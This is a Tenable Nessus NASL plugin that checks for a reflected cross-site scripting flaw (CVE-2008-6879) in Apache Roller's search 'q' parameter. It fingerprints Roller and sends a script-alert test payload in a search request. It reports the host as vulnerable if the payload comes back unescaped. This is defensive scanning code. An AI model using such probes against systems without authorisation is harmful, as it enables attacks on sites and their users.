#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(35299);
  script_version("$Revision: 1.13 $");

  script_cve_id("CVE-2008-6879");
  script_bugtraq_id(33110);
  script_osvdb_id(51151);
  script_xref(name:"Secunia", value:"31523");

  script_name(english:"Apache Roller q Parameter XSS");
  script_summary(english:"Tries to inject script code through Roller's search parameter");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a Java web application that is affected
by a cross-site scripting vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Apache Roller, a multi-user blog server
written in Java. 

The version of Apache Roller installed on the remote host fails to
sanitize user input to the 'q' parameter of search requests before
including it in dynamic HTML output.  An attacker may be able to
leverage this issue to inject arbitrary HTML and script code into a
user's browser to be executed within the security context of the
affected site." );
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?75c214e4" );
 script_set_attribute(attribute:"solution", value:
"Apply the code fix referenced in revision 668737 from the Subversion
repository." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(79);
 script_set_attribute(attribute:"plugin_publication_date", value: "2009/01/07");
 script_cvs_date("$Date: 2016/05/04 14:21:28 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe",value:"cpe:/a:apache:roller");
script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2009-2016 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "cross_site_scripting.nasl");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (get_kb_item("www/"+port+"/generic_xss")) exit(0);


# A simple exploit.
exploit = string("nessus<script>alert('", SCRIPT_NAME, "')</script>");


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/roller", "/blogs", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Look for Roller and its search form.
  if (dir == "/") url = dir;
  else url = dir + "/";

  res = http_get_cache(item:url, port:port, exit_on_fail: 1);

  # If...
  if (
    # it's Roller and...
    (
      '<meta name="generator" content="Roller Weblogger' >< res ||
      '/roller-ui/login-redirect.rol"' >< res ||
      '/roller-ui/login-redirect.jsp"' >< res ||
      '<li class="rReferersListItem">' >< res ||
      'ul.rMenu, ul.rFolder, ul.rFeeds, ul.rReferersList, ul.rEntriesList' >< res
    ) &&
    # we can find the search form.
    '<form id="searchForm" method="get" action="' >< res
  )
  {
    search_url = strstr(res, '<form id="searchForm" method="get" action="') - 
      '<form id="searchForm" method="get" action="';
    search_url = search_url - strstr(search_url, '"');

    if (
      strlen(search_url) > 0 && 
      stridx(search_url, '/') == 0 &&
      ereg(string:search_url, pattern:"^[/a-zA-Z0-9_-]+$")
    )
    {
      # Try to exploit the issue.
      url = string(search_url, "?q=", urlencode(str:exploit));

      res = http_send_recv3(method:"GET", item:url, port:port);
      if (res == NULL) exit(0);

      # There's a problem if we see our exploit in the default search form.
      if (
        string("<title>Search Results for '", exploit) >< res[2] ||
        string('You searched this site for "<a href="http://dictionary.com/search?q=', exploit) >< res[2]
      )
      {
        set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);

        if (report_verbosity)
        {
          report = string(
            "\n",
            "Nessus was able to exploit the issue using the following URL :\n",
            "\n",
            "  ", build_url(port:port, qs:url), "\n"
          );
          security_warning(port:port, extra:report);
        }
        else security_warning(port);
      }
    }
  }
}
